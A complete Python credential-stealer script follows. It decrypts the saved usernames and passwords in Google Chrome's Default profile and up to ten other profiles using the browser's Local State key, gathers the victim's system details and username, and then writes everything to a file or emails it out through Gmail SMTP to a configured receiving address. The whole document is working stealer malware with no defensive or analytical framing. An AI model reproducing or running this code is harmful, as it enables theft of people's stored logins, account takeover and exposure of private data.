SEND_EMAIL_ADDRESS = r""
SEND_EMAIL_PASSWORD = r""
RECIEVE_EMAIL = r""
REPORT_METHOD = "file"  # "file" or "email". any other will print the output

import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
import platform
from getpass import getuser
import smtplib


email_content_to_send = ""
try:
    try:
        email_content_to_send += f"\nUsername: {getuser()}"
    except:
        pass
    try:
        email_content_to_send += f"\nSystem: {platform.system()}"
    except:
        pass
    try:
        email_content_to_send += f"\nMachine: {platform.machine()}"
    except:
        pass
    try:
        email_content_to_send += f"\nVersion: {platform.version()}"
    except:
        pass
    try:
        email_content_to_send += f"\nPlatform: {platform.platform()}"
    except:
        pass
    try:
        email_content_to_send += f"\nProcessor: {platform.processor()}"
    except:
        pass     
except:
    pass
email_content_to_send += "\n\n\n"

def CHROME_PASSWORD_EXTRACTOR(profile="Default", savefname="chromePass_default"):

    def get_chrome_datetime(chromedate):
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

    def get_encryption_key():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""

    def main():
        global email_content_to_send
        email_content_to_send += f"\n---------------------------------------------\nPasswords From {profile}\n---------------------------------------------\n"
        key = get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "Google", "Chrome", "User Data", profile, "Login Data")
        filename = f"{savefname}.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]        
            if username or password:
                email_content_to_send += f"\nOrigin URL: {origin_url}"
                email_content_to_send += f"\nAction URL: {action_url}"
                email_content_to_send += f"\nUsername: {username}"
                email_content_to_send += f"\nPassword: {password}"
            else:
                continue
            if date_created != 86400000000 and date_created:
                email_content_to_send += f"\nCreation date: {str(get_chrome_datetime(date_created))}"
            if date_last_used != 86400000000 and date_last_used:
                email_content_to_send += f"\nLast Used: {str(get_chrome_datetime(date_last_used))}"
            email_content_to_send += "\n\n==================================================\n\n"
        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except:
            try:
                os.system(f'del {filename}')
            except:
                os.system(f'ren "{filename}" "emmamackey.{filename.split(".")[0]}.exe.txt.docx.rtf.xlsx"')

    try:
        main()
    except Exception as e:
        print("Error: ", e)






all_profiles = []
for i in range(10):
    all_profiles.append((f"Profile {i+1}", f"chrome_prof_{i+1}"))
CHROME_PASSWORD_EXTRACTOR(profile="Default", savefname="chrome_pass_default")
for prof, sfname in all_profiles:
    CHROME_PASSWORD_EXTRACTOR(profile=prof, savefname=sfname)

if REPORT_METHOD == "file":
    with open(f'Passwords.txt', "w", encoding="utf8") as feil:
        feil.write(email_content_to_send)
elif REPORT_METHOD == "email":
    server = smtplib.SMTP(host="smtp.gmail.com", port=587)
    server.starttls()
    server.login(SEND_EMAIL_ADDRESS, SEND_EMAIL_PASSWORD)
    server.sendmail(SEND_EMAIL_ADDRESS, RECIEVE_EMAIL, email_content_to_send)
    server.quit()
else:
    print(email_content_to_send)


